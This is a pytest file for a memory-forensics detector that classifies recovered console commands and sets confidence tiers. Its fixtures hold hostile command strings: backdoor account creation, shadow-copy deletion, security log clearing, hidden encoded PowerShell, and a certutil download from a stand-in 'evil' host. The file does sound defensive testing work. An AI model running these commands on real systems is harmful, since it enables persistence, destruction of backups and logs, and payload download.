"""Recovered-command detector for the memory lane (``detect_command_execution``).

``detect_console_activity`` states that console artifacts are *present*. This
detector answers the narrower, higher-tier question: did volatility actually
recover a COMMAND — a typed console-history entry (``windows.consoles`` /
``windows.cmdscan`` ``CommandHistory`` rows) or a command payload passed to an
interpreter (``windows.cmdline`` ``cmd.exe /c ...``, ``powershell -enc ...``)?
A bare ``"C:\\Windows\\system32\\cmd.exe"`` is an open shell, not a recovered
command, and must emit nothing.

Three load-bearing disciplines are pinned here, in the same spirit as
``registry_persistence_candidates``' tell gate ("compute_verdict treats any
CONFIRMED finding as SUSPICIOUS — a benign enterprise disk must not flip on
stock autoruns"):

1. **Strict evidence gate.** Only an actually recovered command fires. Empty
   plugin output, unreadable PEB rows, and bare interpreter paths emit nothing.
2. **Tell gate for the CONFIRMED tier.** A recovered command reaches CONFIRMED
   only when its content carries a suspicious tell AND a second, non-memory
   artifact class corroborates it. An admin typing ``dir`` must not flip a
   healthy host to SUSPICIOUS.
3. **Memory-only stays HYPOTHESIS.** Any ``T1059*`` tag makes
   ``_claims_execution`` true, and the report-QA gate
   ``execution_requires_two_current_artifact_classes`` treats ``{"memory"}``
   as too weak for a CONFIRMED/INFERRED execution claim. A memory-only
   recovered command is therefore a scoped lead, which is also what
   ``_ablate_single_class_execution`` would independently enforce.

The last class in this file pins that policy *structurally*: a memory-only
CONFIRMED ``T1059.003`` finding is deterministically ablated back to INFERRED
and cannot escalate the verdict. That is the receipt for why the memlabs
verdict leg is not forced green from memory alone.
"""

from __future__ import annotations

import sys
from pathlib import Path

_REPO = Path(__file__).resolve().parents[3]
_SCRIPTS = _REPO / "scripts"
if str(_SCRIPTS) not in sys.path:
    sys.path.insert(0, str(_SCRIPTS))

import find_evil_auto as fea  # noqa: E402

from findevil_agent.entailment import check_entailment  # noqa: E402
from findevil_agent.events import AssertedValue  # noqa: E402

CASE = "case-mem-cmdexec"
EVIDENCE = "/evidence/memdump.raw"
TCID_CMDLINE = "tc-004"
TCID_HISTORY = "tc-005"
TCID_EVTX = "tc-evtx-1"


def _cmdline_row(pid: int, process: str, args: str) -> dict:
    """A row shaped like Vol3 ``windows.cmdline -r json`` output."""
    return {"PID": pid, "Process": process, "Args": args, "__children": []}


def _history_row(pid: int, index: int, command: str, process: str = "conhost.exe") -> dict:
    """A row shaped like Vol3 ``windows.cmdscan`` / ``windows.consoles`` output.

    Both plugins render the same TreeGrid columns
    ``(PID, Process, ConsoleInfo, Property, Address, Data)``; a typed command is
    a row whose ``Property`` is a ``CommandHistory_<n>_Command_<m>`` entry and
    whose ``Data`` holds the recovered text.
    """
    return {
        "PID": pid,
        "Process": process,
        "ConsoleInfo": "0x1e0a70",
        "Property": f"_CONSOLE_INFORMATION.HistoryList.CommandHistory_0_Command_{index}",
        "Address": "0x1e1f80",
        "Data": command,
    }


def _raw_cmdline_output(rows: list[dict]) -> dict:
    """Mirror the serialized ``VolRunOutput`` the verifier re-extracts from."""
    return {
        "plugin": "windows.cmdline",
        "rows": list(rows),
        "rows_seen": len(rows),
        "stderr_tail": "",
    }


def _raw_history_output(rows: list[dict], plugin: str = "windows.cmdscan") -> dict:
    return {"plugin": plugin, "rows": list(rows), "rows_seen": len(rows), "stderr_tail": ""}


def _detect(cmdline_rows, history_rows, **kwargs):
    return fea.detect_command_execution(
        cmdline_rows,
        history_rows,
        TCID_CMDLINE,
        TCID_HISTORY,
        CASE,
        EVIDENCE,
        **kwargs,
    )


def _avs(finding: dict) -> list[AssertedValue]:
    return [AssertedValue(**av) for av in finding.get("asserted_values", [])]


# ---------------------------------------------------------------------------
# The strict evidence gate
# ---------------------------------------------------------------------------


# Measured, not invented: the literal ``windows.cmdline`` rows volatility3
# 2.28.0 returns for the MemLabs Lab 1 image (MemoryDump_Lab1.raw) on the lab
# host. Every console host is a BARE interpreter path — no command recovered.
MEMLABS_LAB1_CONSOLE_ROWS = [
    _cmdline_row(1984, "cmd.exe", '"C:\\Windows\\system32\\cmd.exe" '),
    _cmdline_row(2692, "conhost.exe", "\\??\\C:\\Windows\\system32\\conhost.exe"),
    _cmdline_row(2260, "conhost.exe", "\\??\\C:\\Windows\\system32\\conhost.exe"),
]


class TestEvidenceGate:
    def test_bare_interactive_shell_emits_nothing(self) -> None:
        assert _detect(MEMLABS_LAB1_CONSOLE_ROWS, []) == []

    def test_empty_plugin_output_emits_nothing(self) -> None:
        assert _detect([], []) == []
        assert _detect(None, None) == []

    def test_unreadable_peb_row_emits_nothing(self) -> None:
        rows = [_cmdline_row(1984, "cmd.exe", "Required memory at 0x0 is not valid")]
        assert _detect(rows, []) == []

    def test_non_interpreter_with_arguments_emits_nothing(self) -> None:
        # svchost is not a command interpreter; its switches are not a command.
        rows = [_cmdline_row(500, "svchost.exe", "svchost.exe -k netsvcs")]
        assert _detect(rows, []) == []

    def test_console_history_row_without_data_emits_nothing(self) -> None:
        rows = [_history_row(2692, 0, "   ")]
        assert _detect([], rows) == []

    def test_non_command_console_property_emits_nothing(self) -> None:
        # Screen geometry / title rows are console metadata, not typed commands.
        rows = [
            {
                "PID": 2692,
                "Process": "conhost.exe",
                "ConsoleInfo": "0x1e0a70",
                "Property": "_CONSOLE_INFORMATION.OriginalTitle",
                "Address": "0x1e1f80",
                "Data": "C:\\Windows\\system32\\cmd.exe",
            }
        ]
        assert _detect([], rows) == []


# ---------------------------------------------------------------------------
# What a recovered command looks like
# ---------------------------------------------------------------------------


class TestRecoveredCommands:
    def test_console_history_command_is_tagged_t1059_003(self) -> None:
        rows = [_history_row(2692, 0, "net user hacker P@ssw0rd /add")]
        findings = _detect([], rows)
        assert len(findings) == 1
        f = findings[0]
        assert f["mitre_technique"] == "T1059.003"
        assert f["tool_call_id"] == TCID_HISTORY
        assert "net user hacker" in f["description"]

    def test_cmd_slash_c_payload_is_a_recovered_command(self) -> None:
        rows = [_cmdline_row(1984, "cmd.exe", '"C:\\Windows\\system32\\cmd.exe" /c whoami')]
        findings = _detect(rows, [])
        assert len(findings) == 1
        assert findings[0]["mitre_technique"] == "T1059.003"
        assert findings[0]["tool_call_id"] == TCID_CMDLINE

    def test_powershell_encoded_command_is_tagged_t1059_001(self) -> None:
        rows = [
            _cmdline_row(
                3120,
                "powershell.exe",
                "powershell.exe -nop -w hidden -enc SQBFAFgAIAA=",
            )
        ]
        findings = _detect(rows, [])
        assert len(findings) == 1
        assert findings[0]["mitre_technique"] == "T1059.001"

    def test_history_rows_take_precedence_over_cmdline_payload(self) -> None:
        # Both sources present: one finding, citing the stronger history source.
        cmd = [_cmdline_row(1984, "cmd.exe", 'cmd.exe /c "dir"')]
        hist = [_history_row(2692, 0, "vssadmin delete shadows /all /quiet")]
        findings = _detect(cmd, hist)
        assert len(findings) == 1
        assert findings[0]["tool_call_id"] == TCID_HISTORY

    def test_finding_id_for_callable_is_applied(self) -> None:
        rows = [_history_row(2692, 0, "whoami")]
        f = _detect([], rows, finding_id_for=lambda base: f"{base}-abcd1234")[0]
        assert f["finding_id"].endswith("-abcd1234")


# ---------------------------------------------------------------------------
# Tier discipline — the tell gate and the memory-only floor
# ---------------------------------------------------------------------------


class TestTierDiscipline:
    def test_memory_only_recovered_command_stays_hypothesis(self) -> None:
        rows = [_history_row(2692, 0, "vssadmin delete shadows /all /quiet")]
        f = _detect([], rows)[0]
        assert f["confidence"] == "HYPOTHESIS"

    def test_benign_command_with_second_class_is_not_confirmed(self) -> None:
        rows = [_history_row(2692, 0, "dir c:\\users")]
        f = _detect([], rows, corroborating_tcids=(TCID_EVTX,), corroborating_classes=("evtx",))[0]
        assert f["confidence"] == "INFERRED"

    def test_suspicious_tell_plus_second_class_reaches_confirmed(self) -> None:
        rows = [_history_row(2692, 0, "vssadmin delete shadows /all /quiet")]
        f = _detect([], rows, corroborating_tcids=(TCID_EVTX,), corroborating_classes=("evtx",))[0]
        assert f["confidence"] == "CONFIRMED"
        assert TCID_EVTX in f["derived_from"]

    def test_suspicious_tell_alone_never_reaches_confirmed(self) -> None:
        # No second artifact class: SOUL.md's >=2-fact rule keeps it a lead even
        # though the recovered command is unambiguously hostile.
        rows = [_history_row(2692, 0, "wevtutil cl Security")]
        assert _detect([], rows)[0]["confidence"] == "HYPOTHESIS"

    def test_no_memory_only_finding_trips_the_execution_gate(self) -> None:
        """The report-QA gate skips HYPOTHESIS execution claims; a memory-only
        finding at any higher tier would FAIL ``execution_requires_two_current_
        artifact_classes`` and block the report."""
        rows = [_history_row(2692, 0, "certutil -urlcache -f http://evil/a.exe a.exe")]
        f = _detect([], rows)[0]
        assert fea._claims_execution(f)
        assert f["confidence"] == "HYPOTHESIS"


# ---------------------------------------------------------------------------
# Fact fidelity — asserted values the verifier re-extracts
# ---------------------------------------------------------------------------


class TestAssertedValues:
    def test_history_finding_asserts_values_present_in_raw_output(self) -> None:
        rows = [_history_row(2692, 0, "net user hacker P@ssw0rd /add")]
        f = _detect([], rows, corroborating_tcids=(TCID_EVTX,), corroborating_classes=("evtx",))[0]
        assert f["asserted_values"]
        result = check_entailment(_avs(f), _raw_history_output(rows))
        assert result.passed, result.reason

    def test_history_misread_is_caught_when_command_absent(self) -> None:
        rows = [_history_row(2692, 0, "net user hacker P@ssw0rd /add")]
        f = _detect([], rows)[0]
        other = [_history_row(2692, 0, "dir")]
        result = check_entailment(_avs(f), _raw_history_output(other))
        assert not result.passed

    def test_cmdline_finding_asserts_values_present_in_raw_output(self) -> None:
        rows = [_cmdline_row(1984, "cmd.exe", '"C:\\Windows\\system32\\cmd.exe" /c whoami')]
        f = _detect(rows, [])[0]
        result = check_entailment(_avs(f), _raw_cmdline_output(rows))
        assert result.passed, result.reason

    def test_cmdline_misread_is_caught_when_row_absent(self) -> None:
        rows = [_cmdline_row(1984, "cmd.exe", '"C:\\Windows\\system32\\cmd.exe" /c whoami')]
        f = _detect(rows, [])[0]
        other = [_cmdline_row(1984, "cmd.exe", '"C:\\Windows\\system32\\cmd.exe" ')]
        result = check_entailment(_avs(f), _raw_cmdline_output(other))
        assert not result.passed


# ---------------------------------------------------------------------------
# Verdict floors
# ---------------------------------------------------------------------------


class TestVerdictFloor:
    def test_memory_only_recovered_command_does_not_escalate_verdict(self) -> None:
        rows = [_history_row(2692, 0, "vssadmin delete shadows /all /quiet")]
        stub = object.__new__(fea.Investigation)
        assert fea.Investigation.compute_verdict(stub, _detect([], rows)) == "INDETERMINATE"

    def test_memlabs_lab1_console_rows_leave_the_finding_set_untouched(self) -> None:
        # The real Lab 1 rows recover no command, so this detector contributes
        # nothing to that case's verdict leg.
        assert _detect(MEMLABS_LAB1_CONSOLE_ROWS, []) == []


class TestSingleClassAblationIsStructural:
    """Receipt for why a memory-only ``T1059.003`` CONFIRMED finding cannot
    reach SUSPICIOUS even if someone hand-wrote one: any ``T1059*`` tag makes
    ``_claims_execution`` true, all ``vol_*`` tools map to the single artifact
    class ``memory``, and ``_ablate_single_class_execution`` downgrades
    CONFIRMED -> INFERRED before ``compute_verdict`` runs. Deleting this test is
    the only way to pretend otherwise."""

    def _memory_only_confirmed(self) -> dict:
        return {
            "case_id": CASE,
            "finding_id": "f-B-handwritten",
            "tool_call_id": TCID_HISTORY,
            "artifact_path": EVIDENCE,
            "description": "console command history recovered from the image",
            "confidence": "CONFIRMED",
            "pool_origin": "B",
            "mitre_technique": "T1059.003",
            "derived_from": [TCID_HISTORY, TCID_CMDLINE],
        }

    def test_t1059_tag_alone_makes_it_an_execution_claim(self) -> None:
        assert fea._claims_execution(self._memory_only_confirmed())

    def test_every_cited_vol_run_call_is_the_same_artifact_class(self) -> None:
        tc_index = {TCID_HISTORY: "vol_run", TCID_CMDLINE: "vol_run"}
        assert fea.ablation_finding_classes(self._memory_only_confirmed(), tc_index) == {"memory"}

    def test_ablation_downgrades_and_verdict_stays_indeterminate(self) -> None:
        stub = object.__new__(fea.Investigation)
        stub.tool_calls = [
            {"tool_call_id": TCID_HISTORY, "tool": "vol_run"},
            {"tool_call_id": TCID_CMDLINE, "tool": "vol_run"},
        ]
        stub.verdict_revisions = []
        stub._audit = lambda *_a, **_kw: None
        merged = fea.Investigation._ablate_single_class_execution(
            stub, None, [self._memory_only_confirmed()]
        )
        assert [m["confidence"] for m in merged] == ["INFERRED"]
        assert fea.Investigation.compute_verdict(stub, merged) == "INDETERMINATE"
